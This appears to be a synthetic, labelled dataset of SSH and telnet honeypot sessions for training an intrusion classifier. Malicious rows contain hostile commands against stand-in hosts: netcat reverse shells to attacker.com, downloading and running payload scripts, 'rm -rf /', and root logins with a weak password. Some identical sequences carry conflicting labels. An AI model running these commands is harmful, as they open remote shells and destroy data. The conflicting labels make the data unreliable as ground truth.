session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
eda78440-2522-43ae-b2c1-e26613e4bf8a,60.104.146.20,telnet,274.32,3,3,date; ; pwd; pwd,0
e3765f81-e03a-4b02-99b3-6d6f3df167ed,119.98.161.238,ssh,36.58,2,2,pwd; date,0
f5249c23-70bc-442b-abd9-975dce39984b,143.136.60.93,telnet,227.58,1,2,; logout,0
c6cdc65d-6fa6-4876-bace-b7254c7c7926,82.109.70.38,telnet,533.87,19,4,wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
ea1d78bc-d3b1-4b10-a37e-ff73fc91a7e3,161.50.79.13,ssh,169.29,4,3,date; cd /home; date,0
4e436ead-fac6-49e4-8a82-8bacceb2b4cc,168.219.200.164,telnet,422.41,19,7,wget http://malicious.site/payload.sh; rm -rf /; wget http://malicious.site/payload.sh; python -m http.server 8080; ./payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
4e33be9a-234d-44cd-b56d-b9de8972d363,201.166.78.168,ssh,6.28,2,3,; logout; exit,0
08f51212-f28a-42b6-a075-a00ef9bdefc3,240.120.204.89,telnet,342.69,20,5,curl -O http://badhost/exploit; chmod +x payload.sh; echo 'pwned' > /tmp/x; ./payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
80212ee5-1a59-4543-887a-b0310023f740,241.18.247.99,telnet,5.82,17,5,rm -rf /; ./payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
49143748-c44f-45f2-8b5b-45338110888d,10.68.156.36,ssh,215.73,2,3,uptime; logout; ,0
6b52035a-f60a-4570-add4-7dae15758910,76.45.183.154,ssh,282.04,4,4,; date; logout; cd /home,0
883b8e60-69eb-440a-bdfe-159cbbdf0bb9,248.92.129.24,ssh,55.49,2,4,; uptime; exit; ,0
a3db84cc-cf2e-4296-b00d-179489f187d1,187.244.193.47,ssh,222.16,3,3,date; logout; exit,0
8ad4891a-4588-4342-922f-5f86cdd41395,141.162.93.190,ssh,228.99,2,3,; uptime; date,0
ambiguous-extra-61,10.1.0.61,ssh,306.8959716,11,1,date; whoami; wget http://bad.com,0
scan-extra-24,172.20.0.24,telnet,0,0,0,,0
a55d41cc-0750-4ec0-ac7f-f2f5975b6121,137.10.132.119,ssh,668.84,11,4,sshpass -p '1234' ssh root@target; ./payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
3d7cd6d5-d8ac-4265-8c4d-c3e168082a73,89.142.143.247,telnet,141.81,2,3,whoami; exit; ; ,0
6ab54a86-c871-4044-8426-9f328f16835c,8.220.203.212,ssh,111.46,3,2,cd /home; whoami,0
813283df-8a9e-47f5-be7c-dc8b7eea710d,159.187.84.199,ssh,742.81,17,6,./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; ./payload.sh; rm -rf /,1
e72353c5-fae8-4b8f-a7f3-f9ca8d4d4a68,155.187.94.174,ssh,62.12,1,3,; whoami; ; ,0
cee69f41-733c-4c16-a151-43b98cb813ad,103.130.195.147,ssh,240.16,4,4,uptime; cd /home; ; whoami,0
c598dbbc-e367-4811-a14d-487aad3fbcaa,80.38.67.41,ssh,225.62,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
32e1024b-85e1-4748-bbeb-d4e06570ae54,22.71.3.204,ssh,837.84,21,5,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; ./payload.sh; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
aee592ab-32d7-4981-9a00-44719b6cad80,40.218.239.236,ssh,189.15,19,4,rm -rf /; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; ./payload.sh; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x,1
739444a4-8034-42c7-983c-fa15781750da,195.55.89.175,telnet,231.29,3,3,uptime; logout; uptime,0
dae7b669-c76b-4bc1-b90d-6f6c44e1111a,100.239.174.22,ssh,275.31,2,4,; exit; ; logout,0
0ba9fbfc-539d-4557-98be-2c4728b432de,154.224.220.149,telnet,731.48,22,4,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; curl -O http://badhost/exploit; ./payload.sh; echo 'pwned' > /tmp/x,1
0983c2ab-8e8f-4e75-aadc-94d7604b77bd,122.84.53.135,telnet,299.55,2,3,pwd; ; ; whoami,0
3a0035b8-6884-41fc-9983-a70e79f28f32,87.6.74.237,ssh,106.2,1,3,; ; ls,0
2c724350-f04e-456c-9af5-c3e27209b811,165.202.187.103,telnet,552.63,13,5,./payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; ./payload.sh,1
1879cb5c-ed3e-4751-b564-f4009a9e6a14,213.244.62.28,ssh,97.62,16,4,wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
1552c77c-1e80-4467-a7c4-2609a7157e67,141.162.14.194,ssh,288.32,1,2,uptime; ,0
34229d91-1607-4e91-88e4-97be1040b54b,92.168.138.183,ssh,696.32,23,5,./payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; rm -rf /,1
b196685d-f82f-4057-aec7-f8ba21f65831,101.240.70.32,ssh,520.89,9,4,wget http://malicious.site/payload.sh; rm -rf /; ./payload.sh; scp exploit.sh root@target:/tmp/,1
9b3e9b6f-3da0-4ace-b828-c3fab64aeca8,17.25.77.92,ssh,33.02,15,4,nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; ./payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/,1
0d9c32a3-bde2-4cbe-b063-841bfb366aa6,77.73.223.68,ssh,371.03,18,3,echo 'pwned' > /tmp/x; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444,1
29fc6905-8ace-4267-aeb0-3937df874db3,8.221.52.30,ssh,484.32,24,6,rm -rf /; curl -O http://badhost/exploit; ./payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target; rm -rf /; sshpass -p '1234' ssh root@target,1
d3d8acec-0a7a-4da3-ba07-499f791b97cc,23.143.209.117,ssh,233.32,1,2,pwd; ,0
ef063b63-0dae-4c1d-9946-fe364f64bd2b,113.9.47.156,telnet,118.71,4,4,logout; ; date; cd /home,0
0774dbc8-a704-46f2-a51d-db08911183f4,90.98.191.201,ssh,108.21,5,3,pwd; echo test; wget http://suspicious.site/x,0
f3ba138d-5173-4a90-917d-a80cb4ca1661,68.69.22.172,ssh,202.1,5,3,exit; cd /home; cd /home; ,0
5539b162-e9fc-4432-9f79-07bfd3c73017,75.30.255.66,ssh,234.72,3,4,date; date; logout; ,0
a451a992-7c63-44e9-917f-b1da9b2d8d2c,187.96.251.79,ssh,62.02,3,3,; date; pwd; date,0
e2665e9c-f1b9-4d52-8e9b-a669fcde316a,237.0.103.28,telnet,223.41,3,4,; pwd; exit; logout,0
7660fe5c-d018-47b5-852b-93a11b402115,195.145.232.41,ssh,124.22,4,4,exit; cd /home; exit; ,0
idle-extra-32,192.168.100.32,telnet,1145.947767,0,0,,0
1215baa4-1ae2-48d0-af6d-510d17d0069d,238.246.178.224,ssh,221.77,3,2,cd /home; pwd,0
7f1bca4b-aadc-4aff-af9e-bc6ca1591192,103.6.76.88,ssh,76.72,2,3,; pwd; uptime,0
a7eef0c0-f6b2-42d3-a100-e7df0ef7ee14,95.34.242.12,ssh,632.98,23,6,rm -rf /; chmod +x payload.sh; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; chmod +x payload.sh; ./payload.sh,1
a30896fd-8b5b-484f-bd5f-a53674537d8d,215.135.210.129,telnet,177.35,0,2,; ,0
54dc4dd6-9255-4674-ad8b-03fa369837ab,169.9.28.53,ssh,98.61,2,3,pwd; exit; ,0
b9812e9c-0606-42b1-b64f-dfe735c595e7,112.132.181.64,ssh,132.83,1,2,logout; ,0
24b765a3-caf1-4d1a-a078-7ff3acd20abd,5.93.216.184,ssh,119.4,0,2,; ,0
ef36fd13-0ab5-4556-b6c9-327d837ee598,141.62.255.93,telnet,154.14,2,2,pwd; exit,0
a6a363ca-750e-4fe2-8504-df62a2dea8c8,99.170.40.213,ssh,257.41,3,3,whoami; whoami; ls,0
fb11e339-8dbf-4cd9-b9da-9490c06e2bab,21.98.225.244,ssh,488.69,5,3,pwd; echo test; wget http://suspicious.site/x,1
07d0755d-6784-4815-8eb6-0783fb0eac74,252.218.125.176,ssh,126.69,19,4,curl -O http://badhost/exploit; chmod +x payload.sh; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
9a46c2b9-036a-4c50-be77-bf19dddffff5,106.57.143.29,ssh,75.84,2,3,uptime; ; uptime,0
8cd77e2b-e2bd-4e17-b336-ddb2326e657f,188.213.66.247,ssh,161.17,21,6,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; ./payload.sh; rm -rf /,1
4ac42235-cf73-4357-a585-87039e400074,84.214.248.22,ssh,29.93,5,3,ls; whoami; curl -O http://badhost/file,0
a8e32c18-f146-4dfc-b604-7bb74259a296,109.135.142.182,ssh,162.3,2,2,cd /home; ; ; ,0
1c6ce894-d8ef-4c8c-a5e8-4bf14315cc2f,146.166.98.53,ssh,88.36,4,3,exit; date; pwd; pwd,0
564f1bbf-54a4-41a9-9b92-be4ca1192d99,227.129.238.59,telnet,516.24,15,5,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; rm -rf /; ./payload.sh,1
bab127c4-daa2-4a4a-83c2-b3bf3c1f1cd8,36.198.216.139,telnet,342.32,20,5,sshpass -p '1234' ssh root@target; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
764e05b5-0f18-4b65-bf76-fec86df553fa,222.167.104.206,ssh,15.4,2,3,ls; exit; ; ,0
08979bfc-7351-42f1-bca9-e40543ec8070,110.12.220.178,ssh,804.93,22,6,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; python -m http.server 8080; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
e4dcfd1f-8530-4ca1-9dd2-0cf9b2447372,210.135.54.83,ssh,76.62,28,6,chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; rm -rf /; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
1ee16741-3cc2-470c-a05b-8044d23d2c00,235.24.94.169,telnet,23.53,2,4,; pwd; exit; ,0
2c39fbcf-ad4d-4a13-9962-053c1590cb60,96.242.66.3,ssh,231.07,4,3,cd /home; whoami; date,0
8fb26a02-a8aa-4151-8b27-e9137b288f28,46.84.142.25,ssh,172.74,3,3,uptime; exit; uptime,0
a13a1919-0dd9-44f9-95e3-0dd7199734e2,175.31.127.132,ssh,822.19,5,3,pwd; echo test; wget http://suspicious.site/x,1
4fa24edc-f5ae-4864-bc3b-86d2a24242dc,76.218.206.44,ssh,109.52,13,4,chmod +x payload.sh; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh,1
203eceeb-b155-4890-86db-61f4df2f0054,107.64.238.123,ssh,268.41,4,4,cd /home; ; date; ls,0
2205dc98-c086-4266-a506-daa19bafd5c7,125.175.66.160,ssh,83.94,3,3,whoami; date; ls,0
9870cc81-1499-4076-a2b6-e74d02acc803,51.122.249.183,ssh,553.48,23,7,rm -rf /; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
699d0dc7-63ab-45ec-a276-9bdf8ee593c7,85.128.55.88,ssh,312.56,5,3,ls; whoami; curl -O http://badhost/file,1
f3444f9e-580b-4a80-9ea8-32762e1bba1e,159.194.153.198,ssh,8.15,2,3,logout; ; ; pwd,0
5e10878f-9217-4d5b-a2e7-fcd0560738f7,102.61.225.48,telnet,19.99,1,2,whoami; ,0
d857f166-0211-4263-ac93-d205103ca452,144.85.42.196,ssh,274.38,2,3,logout; ls; ,0
dd547bd8-d7f8-4694-ab71-e1f8fb7ef7e9,29.35.121.23,telnet,242.19,4,3,cd /home; whoami; logout,0
217b2148-8c98-4f47-b196-a853ab2684ba,247.162.118.175,ssh,126.95,1,2,uptime; ,0
f38fa532-30fe-417a-a3a1-27e620ab1365,161.39.117.47,ssh,171.74,4,3,ls; uptime; uptime; pwd,0
5d579b52-9058-4584-a7d2-37fe48d33978,65.31.253.222,ssh,239.71,3,3,exit; ls; exit,0
2499c762-b0b0-45f0-84da-fe8f2bb400d9,227.80.3.56,ssh,251.17,1,2,date; ; ,0
92fc6948-c0fd-4c24-9ac2-e3481e78db92,175.184.16.103,telnet,6.11,4,4,uptime; ls; logout; uptime,0
2a095981-c291-4a4c-ac58-c8d4995838cb,74.92.60.17,ssh,87.94,4,4,date; uptime; logout; whoami,0
e181c22f-6a61-49a5-b4a8-6ca1817acc84,27.130.200.191,ssh,568.78,16,3,nc -e /bin/sh attacker.com 4444; rm -rf /; rm -rf /; sshpass -p '1234' ssh root@target,1
4a13245a-eadf-49c0-a951-8dacee8e0508,24.183.33.97,ssh,3.37,2,2,pwd; whoami,0
e1ab759e-987d-4aaa-9c0a-038fef0a3d7a,10.227.174.252,ssh,263.3,2,3,; uptime; exit,0
032d8c59-a4b9-486b-a24e-216fcd4f3e5b,208.214.16.69,telnet,16.39,5,3,ls; whoami; curl -O http://badhost/file,1
2b84502b-4950-4120-b36e-98a426e92420,224.247.245.212,ssh,13,1,2,exit; ,0
ambiguous-extra-11,10.1.0.11,ssh,233.7645612,14,3,date; ls; curl http://exploit; whoami; wget http://bad.com,0
49c49eb9-49b9-44f7-bfcd-87ab926efb68,150.118.107.92,ssh,57.65,1,2,; ls,0
26282644-35aa-4d08-9e2d-70fd00e45399,2.108.26.88,ssh,297.57,3,2,pwd; cd /home,0
d3e6c548-9db6-4791-9fda-e0e7b141b31c,4.159.145.197,ssh,834.97,5,3,pwd; echo test; wget http://suspicious.site/x,1
d2d3dbf5-6a78-460b-821e-a86d5009242f,47.215.160.108,ssh,219.41,4,4,pwd; ; cd /home; whoami,0
a4a20493-a71e-402f-88a5-d6a4bc5beba0,69.231.107.144,ssh,669.2,27,6,wget http://malicious.site/payload.sh; python -m http.server 8080; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
538b3fcc-662e-42b0-b95a-2843772e6bb6,108.74.168.74,telnet,51.86,2,3,whoami; ; whoami,0
258c03b0-2b43-4c91-aba6-e12d22e2db1a,229.80.11.3,ssh,17.69,4,3,cd /home; logout; ls,0
d20b6e53-386b-4560-93f4-ce715634e02c,214.204.171.239,ssh,8.32,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
ambiguous-extra-18,10.1.0.18,telnet,168.1687047,14,1,curl http://exploit; whoami; exit; cd /,1
f98ffa44-63e8-46f2-9d18-bd956b58b130,253.114.158.81,ssh,72.13,18,4,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; rm -rf /,1
e058b1b7-24ce-4906-b499-0c546f68a1cb,215.24.81.34,ssh,64.96,14,5,curl -O http://badhost/exploit; curl -O http://badhost/exploit; ./payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/,1
04dbfae1-b73c-4162-9112-287a5feeb78e,83.254.59.218,ssh,157.01,17,5,sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; chmod +x payload.sh,1
c6d9678b-664f-4305-b059-0a8122b03d4c,86.201.47.83,ssh,11.12,3,3,whoami; ; cd /home,0
ecec8fdb-ac98-4b20-98aa-05e916c2297c,26.88.16.30,ssh,134.96,2,3,pwd; exit; ,0
423f1f1f-75f9-4e63-b872-fafa6b3a115b,126.38.15.197,ssh,37.11,2,2,pwd; date,0
02834a15-6c12-4420-9cf4-6d9c7077774d,190.131.50.46,ssh,648.01,16,3,wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080,1
88b326af-0a8b-4cc8-bf9c-fe954244962c,218.56.144.76,ssh,254.36,0,2,; ,0
f4397fdb-6df0-4610-b1de-7aa73d84febb,137.85.34.52,ssh,190.23,5,3,ls; whoami; curl -O http://badhost/file,0
f55d302e-caaa-4c44-a21f-3dc2823a9d8c,10.66.95.138,ssh,488.63,20,5,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
ambiguous-extra-121,10.1.0.121,ssh,68.08001409,10,5,cd /; wget http://bad.com; curl http://exploit; whoami; pwd,0
a16a15e5-d879-42c5-b8be-7781fe8447af,96.57.244.177,ssh,570.89,15,4,curl -O http://badhost/exploit; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
945d2870-bdef-424f-8b9d-756611d3f337,188.97.211.178,ssh,705.9,16,3,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444,1
59ca0f4b-0bde-41ab-ae4d-58b42e029cba,105.209.33.140,ssh,306.19,21,6,python -m http.server 8080; sshpass -p '1234' ssh root@target; rm -rf /; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; ./payload.sh,1
8adc3622-f1d5-4222-89f4-5174acbc47c0,215.90.74.125,telnet,54.43,20,4,sshpass -p '1234' ssh root@target; python -m http.server 8080; ./payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target,1
ef726f1c-e172-41a5-80d1-6a841f50c877,180.139.247.2,ssh,153.84,2,2,date; uptime,0
5fd10a94-41e4-4e71-a543-3ddd3d055a64,255.194.226.31,ssh,45.56,4,3,cd /home; whoami; ; whoami,0
800e8176-64a6-494c-b6ce-28c49061893d,159.178.151.144,ssh,235.32,16,4,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; ./payload.sh,1
324bca6b-f760-409f-976e-6934ec4b4ea5,22.186.1.174,ssh,869.36,13,4,nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; ./payload.sh; wget http://malicious.site/payload.sh,1
cc38f03f-5470-4525-80b1-55e277cb1288,125.70.168.74,ssh,166.77,3,3,exit; date; date; ,0
c2a24533-603c-4b7c-91d9-e2f590864e16,187.201.236.169,ssh,499.25,22,6,scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
d7c04a33-dd20-413a-bb14-1590eef46bf9,146.255.216.60,telnet,297.15,5,3,pwd; echo test; wget http://suspicious.site/x,0
31af7a31-6b89-4f41-9c93-59e85e0bf729,36.242.31.161,ssh,220.83,4,3,uptime; logout; cd /home,0
a952f8e7-a78c-433e-a03f-b95d78431243,177.208.239.250,telnet,707.77,18,5,curl -O http://badhost/exploit; ./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; chmod +x payload.sh,1
feeade41-a1f1-4e5a-8bc8-a17c58b1bfa1,234.197.26.218,telnet,62.83,2,2,cd /home; ,0
9b720edf-535d-44e7-ae3d-f1c88770e78b,56.51.135.104,ssh,18.19,1,2,; logout,0
c8d4d640-8a83-49fa-acf7-2e6c2594fdaf,205.168.115.194,ssh,327.9,23,7,python -m http.server 8080; scp exploit.sh root@target:/tmp/; ./payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
2dc0ae67-b3b1-4195-9251-1ed5c0fef3f4,12.101.224.210,ssh,144.05,1,2,; exit,0
ab7c2868-b00e-4eba-98b8-7ded64d01c6c,192.94.107.43,ssh,162.94,1,3,; ; date,0
eba5830e-c58e-454c-bca8-906137899eb5,136.140.250.124,ssh,54.43,4,4,logout; ls; ; cd /home,0
4a69163d-0861-44d6-9e31-56d1b125fb73,27.83.213.51,telnet,616.08,17,6,wget http://malicious.site/payload.sh; chmod +x payload.sh; ./payload.sh; python -m http.server 8080; ./payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
b6d10076-492c-4d15-9a0e-8a721c3ef2fe,174.77.182.15,ssh,260.76,5,3,date; logout; nc attacker.com 4444,0
69124232-2ee6-4c79-a096-b404a0e5fe4a,45.68.109.164,ssh,84.6,22,5,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; chmod +x payload.sh; curl -O http://badhost/exploit,1
2a60ed34-229f-46f8-a3f0-697b6bce58db,45.190.48.62,ssh,162.75,0,2,; ,0
b6e2fbaf-2f3c-45d9-a2fd-9e3f3c427bf8,127.98.16.238,ssh,126.8,1,2,; exit,0
4d28d4b8-59cb-46a1-baa2-61506ff64036,153.191.168.52,telnet,222.81,3,3,logout; exit; ls,0
d842dc43-c934-445d-8e5e-fb592caf4811,187.202.166.153,ssh,631.91,22,4,sshpass -p '1234' ssh root@target; chmod +x payload.sh; python -m http.server 8080; wget http://malicious.site/payload.sh; python -m http.server 8080; python -m http.server 8080,1
72802257-02ef-4a90-91dd-1d55469a14b5,79.187.132.229,telnet,226.1,3,2,cd /home; pwd,0
f3505552-66b0-4ddd-8f1f-c2afd5c42d23,48.85.15.197,ssh,865.84,18,5,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
0607b261-37a2-45e0-b587-84bc20e41716,107.239.50.71,ssh,519.15,21,4,nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; rm -rf /; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444,1
idle-extra-49,192.168.100.49,ssh,888.9507925,0,0,,0
2f81ec1b-bffa-400b-a452-96a0ba30a86c,234.167.8.18,ssh,238.89,2,2,logout; logout,0
9dd218cd-98d0-4118-80a7-71e16fbbeb05,156.213.206.121,ssh,225.33,3,2,ls; ls; ls,0
30ed35e6-9bac-4bcf-a23f-ead530b71637,145.241.102.246,ssh,878.37,16,5,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; python -m http.server 8080; echo 'pwned' > /tmp/x,1
d67727c7-4b4a-43ec-97f1-2c0ef0c845e2,134.95.141.57,telnet,805.58,15,4,rm -rf /; curl -O http://badhost/exploit; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
445fba21-4f76-4e17-9a2a-3dab50dbfdb3,29.132.36.6,telnet,194.07,4,3,cd /home; whoami; logout,0
ambiguous-extra-10,10.1.0.10,telnet,9.24670437,5,1,date; curl http://exploit; cd /,1
45abefd2-d117-4aa8-a545-27bccddc048f,220.212.168.127,ssh,286.63,3,3,exit; exit; ; exit,0
30fa6a6b-2faf-4649-a445-70c745773ebf,101.72.25.106,ssh,11.53,16,5,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; rm -rf /; nc -e /bin/sh attacker.com 4444,1
eabd9b97-ca68-492f-85fa-bc48216950d0,126.189.99.101,ssh,432.14,18,5,sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; python -m http.server 8080; ./payload.sh; rm -rf /,1
8ce9cc2f-03be-4847-bc9e-5f560aee83d6,105.192.90.134,ssh,71.04,20,4,nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
129920e4-623d-4957-b04e-2690ed947188,20.160.233.147,ssh,734.4,12,4,curl -O http://badhost/exploit; ./payload.sh; python -m http.server 8080; chmod +x payload.sh; ./payload.sh,1
0fa245e6-1161-4d90-985f-4cce4a66b208,233.187.2.181,ssh,172.38,2,3,ls; exit; ,0
5a5e3b97-88c0-4e57-81aa-150b1dedf899,140.230.158.97,ssh,128.43,2,3,whoami; ; whoami,0
ambiguous-11,10.0.0.11,ssh,203.092035,4,4,wget http://bad.com; ls; date; curl http://exploit; exit,1
26827c6c-20a5-47c4-bc37-2364a3c90eea,17.119.254.48,ssh,847.22,5,3,ls; whoami; curl -O http://badhost/file,1
15549164-a64e-40ea-a287-6567118d993b,24.35.135.172,ssh,170.72,2,3,; whoami; exit,0
scan-7,172.16.0.7,telnet,0,0,0,,0
487100de-0ab3-4e1f-a412-12a4b3952e1c,114.150.153.26,ssh,163.26,3,2,cd /home; logout,0
967ad6e3-fb68-41a4-9c1d-2644748b3e3f,45.1.231.250,ssh,297.07,3,3,date; cd /home; ; ,0
06445cfb-6335-455c-bc55-09df722563de,79.118.187.131,ssh,13.95,5,3,date; logout; nc attacker.com 4444,0
4ab28e22-44cf-4315-a05b-7a5ae6590a34,76.107.138.127,ssh,213.27,2,3,; whoami; ls,0
2ad4ef9d-89c5-4023-a7f6-b74e1474850e,178.28.64.209,ssh,70.98,3,4,uptime; whoami; logout; ,0
a5e10680-1de7-42af-bdf4-a6b8dbb12eb7,251.156.148.205,telnet,278.44,2,3,logout; ; date,0
426631d7-9739-4a89-acbd-dae19b7c344d,14.57.180.90,ssh,236.74,12,4,chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
77b42765-0f69-410c-8c9e-f87f61e0662e,33.70.221.58,ssh,110.84,2,2,uptime; exit,0
ambiguous-extra-8,10.1.0.8,ssh,513.1487846,4,6,exit; ls; chmod +x payload.sh; wget http://bad.com,0
64b06116-6dd1-4308-bc04-a92397055489,24.154.53.183,telnet,51.61,2,4,; whoami; ; exit,0
c480cff4-8ffb-40a5-898d-50ebcfa526d0,34.102.177.138,ssh,11.6,1,3,; exit; ; ,0
2d8a3305-e65b-4488-b05b-f7f133e07af2,51.29.245.57,ssh,108.82,15,3,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
a5842fc2-d829-481a-bbd3-170eaf641d3a,137.157.202.139,ssh,421.72,18,5,wget http://malicious.site/payload.sh; ./payload.sh; curl -O http://badhost/exploit; python -m http.server 8080; ./payload.sh; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x,1
7033e61e-0e24-4ab2-b62d-0f3d3e6edcc5,44.230.169.21,ssh,830.54,12,4,nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; ./payload.sh,1
